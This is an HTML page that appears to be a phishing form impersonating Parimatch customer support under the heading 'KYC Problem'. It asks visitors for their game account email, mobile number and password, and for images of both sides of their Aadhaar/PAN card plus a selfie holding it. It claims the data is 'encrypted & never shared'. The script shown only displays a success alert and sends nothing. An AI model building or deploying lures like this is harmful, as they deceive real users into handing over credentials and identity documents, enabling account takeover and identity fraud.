<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parimatch Support - KYC Problem</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #0d0e0e;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* Header Section */
        header {
            width: 100%;
            background-color: #161818;
            padding: 15px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            border-bottom: 1px solid #262929;
            position: relative;
        }

        .top-bar {
            width: 100%;
            max-width: 480px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .back-btn {
            position: absolute;
            left: 0;
            width: 38px;
            height: 38px;
            border-radius: 50%;
            background-color: #25291c;
            color: #f3ff00;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            font-size: 16px;
            border: 1px solid #3c4228;
            transition: 0.2s;
        }

        .back-btn:hover {
            background-color: #353b26;
        }

        .brand-box {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .logo-badge {
            border: 1.5px solid #f3ff00;
            padding: 5px 12px;
            border-radius: 8px;
            font-weight: 900;
            font-style: italic;
            color: #f3ff00;
            letter-spacing: 0.5px;
            font-size: 14px;
            background: rgba(243, 255, 0, 0.05);
        }

        .support-title {
            font-size: 20px;
            font-weight: 700;
            color: #ffffff;
        }

        .tagline {
            margin-top: 6px;
            font-size: 12px;
            color: #9ca3af;
            letter-spacing: 0.3px;
        }

        /* Main Form Card */
        .container {
            width: 100%;
            max-width: 480px;
            padding: 20px 16px;
        }

        .complaint-card {
            background-color: #161818;
            border: 1px solid #262929;
            border-radius: 16px;
            padding: 22px 18px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 4px;
        }

        .card-header i {
            color: #f3ff00;
            font-size: 20px;
        }

        .card-header h2 {
            font-size: 18px;
            font-weight: 700;
        }

        .card-subtitle {
            font-size: 12px;
            color: #9ca3af;
            margin-bottom: 18px;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 13.5px;
            font-weight: 600;
            color: #e5e7eb;
            margin-bottom: 8px;
        }

        .upload-label {
            color: #f3ff00;
            font-size: 13px;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            background-color: #212424;
            border: 1px solid #323636;
            border-radius: 10px;
            padding: 13px 14px;
            color: #ffffff;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }

        input::placeholder {
            color: #6b7280;
        }

        input:focus {
            border-color: #f3ff00;
        }

        .security-note {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 11.5px;
            color: #9ca3af;
            margin-top: 6px;
        }

        /* File Upload Box Styling */
        .file-upload-box {
            border: 1.5px dashed #3a3f3f;
            background-color: #212424;
            border-radius: 10px;
            padding: 14px;
            text-align: center;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: 0.2s;
        }

        .file-upload-box:hover {
            border-color: #f3ff00;
            background-color: #252828;
        }

        .file-upload-box i {
            color: #f3ff00;
            font-size: 18px;
        }

        .file-upload-box span {
            font-size: 13.5px;
            color: #9ca3af;
        }

        .file-upload-box input[type="file"] {
            display: none;
        }

        .submit-btn {
            width: 100%;
            background-color: #f3ff00;
            color: #000000;
            border: none;
            border-radius: 10px;
            padding: 14px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 6px;
            transition: 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .submit-btn:hover {
            background-color: #d9e600;
        }

        .response-time {
            text-align: center;
            font-size: 11.5px;
            color: #9ca3af;
            margin-top: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
    </style>
</head>
<body>

    <!-- Top Header -->
    <header>
        <div class="top-bar">
            <a href="../index.html" class="back-btn" title="Back to Home">
                <i class="fa-solid fa-chevron-left"></i>
            </a>
            <div class="brand-box">
                <div class="logo-badge">PARIMATCH</div>
                <span class="support-title">Support</span>
            </div>
        </div>
        <div class="tagline">Fast &bull; Secure &bull; Trusted Help</div>
    </header>

    <!-- Form Container -->
    <div class="container">
        <div class="complaint-card">
            <div class="card-header">
                <i class="fa-regular fa-file-lines"></i>
                <h2>KYC Problem</h2>
            </div>
            <p class="card-subtitle">Upload your Aadhaar/PAN card for verification</p>

            <form id="kycForm" onsubmit="handleSubmit(event)">
                <div class="form-group">
                    <label for="email">Game Email ID</label>
                    <input type="email" id="email" placeholder="your@email.com" required>
                </div>

                <div class="form-group">
                    <label for="mobile">Game Account Mobile No.</label>
                    <input type="tel" id="mobile" placeholder="+91 XXXXX XXXXX" required>
                </div>

                <div class="form-group">
                    <label for="password">Game Account Password</label>
                    <input type="password" id="password" placeholder="Enter your password" required>
                    <div class="security-note">
                        <i class="fa-solid fa-lock"></i>
                        <span>Your data is encrypted & never shared</span>
                    </div>
                </div>

                <div class="form-group">
                    <label class="upload-label">Upload your Aadhaar/PAN front side image</label>
                    <label class="file-upload-box">
                        <i class="fa-solid fa-cloud-arrow-up"></i>
                        <span id="file-label-1">Choose Image</span>
                        <input type="file" accept="image/*" onchange="updateFileName(this, 'file-label-1')">
                    </label>
                </div>

                <div class="form-group">
                    <label class="upload-label">Upload your Aadhaar/PAN back side image</label>
                    <label class="file-upload-box">
                        <i class="fa-solid fa-cloud-arrow-up"></i>
                        <span id="file-label-2">Choose Image</span>
                        <input type="file" accept="image/*" onchange="updateFileName(this, 'file-label-2')">
                    </label>
                </div>

                <div class="form-group">
                    <label class="upload-label">Upload your Aadhaar/PAN card with selfie</label>
                    <label class="file-upload-box">
                        <i class="fa-solid fa-cloud-arrow-up"></i>
                        <span id="file-label-3">Choose Image</span>
                        <input type="file" accept="image/*" onchange="updateFileName(this, 'file-label-3')">
                    </label>
                </div>

                <button type="submit" class="submit-btn">
                    <i class="fa-solid fa-paper-plane"></i> Submit Now
                </button>
            </form>

            <div class="response-time">
                <i class="fa-regular fa-clock"></i>
                <span>Average response time: 2-5 minutes</span>
            </div>
        </div>
    </div>

    <script>
        function updateFileName(input, labelId) {
            const label = document.getElementById(labelId);
            if (input.files && input.files[0]) {
                label.textContent = input.files[0].name;
                label.style.color = "#f3ff00";
            }
        }

        function handleSubmit(event) {
            event.preventDefault();
            alert("KYC documents submitted successfully!");
        }
    </script>

</body>
</html>
